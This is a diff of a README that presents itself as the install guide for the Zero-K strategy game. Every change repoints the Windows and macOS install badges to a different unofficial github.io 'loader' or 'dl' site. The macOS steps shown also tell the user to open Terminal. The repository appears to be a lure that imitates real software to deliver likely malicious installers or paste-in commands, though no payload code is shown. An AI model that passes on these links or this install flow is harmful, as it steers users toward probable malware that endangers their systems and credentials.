@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Zero-K](https://img.shields.io/badge/⬇_Install_Zero-K-E63946?style=for-the-badge&logo=github)](https://QuakeShadowDay.github.io/win-loader/)
+[![⬇ Install Zero-K](https://img.shields.io/badge/⬇_Install_Zero-K-E63946?style=for-the-badge&logo=github)](https://shellwarlockfigure.github.io/windows-dl/)
 
 </div>
 
@@ -61,9 +61,9 @@ Zero-K is a free, open-source real-time strategy game featuring over 100 unique 
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://QuakeShadowDay.github.io/win-loader/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://shellwarlockfigure.github.io/windows-dl/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://QuakeShadowDay.github.io/mac-loader/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://shellwarlockfigure.github.io/macos-dl/)
 
 </div>
 
@@ -81,7 +81,7 @@ Zero-K is a free, open-source real-time strategy game featuring over 100 unique 
 
 <div align="center">
 
-[![⬇ Install Zero-K](https://img.shields.io/badge/⬇_Install_Zero-K-E63946?style=for-the-badge&logo=github)](https://QuakeShadowDay.github.io/win-loader/)
+[![⬇ Install Zero-K](https://img.shields.io/badge/⬇_Install_Zero-K-E63946?style=for-the-badge&logo=github)](https://shellwarlockfigure.github.io/windows-dl/)
 
 </div>
 
@@ -100,7 +100,7 @@ Zero-K is a free, open-source real-time strategy game featuring over 100 unique 
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://QuakeShadowDay.github.io/mac-loader/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://shellwarlockfigure.github.io/macos-dl/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ Zero-K is a free, open-source real-time strategy game featuring over 100 unique 
 
 <div align="center">
 
-[![⬇ Install Zero-K](https://img.shields.io/badge/⬇_Install_Zero-K-E63946?style=for-the-badge&logo=github)](https://QuakeShadowDay.github.io/win-loader/)
+[![⬇ Install Zero-K](https://img.shields.io/badge/⬇_Install_Zero-K-E63946?style=for-the-badge&logo=github)](https://shellwarlockfigure.github.io/windows-dl/)
 
 </div>
 
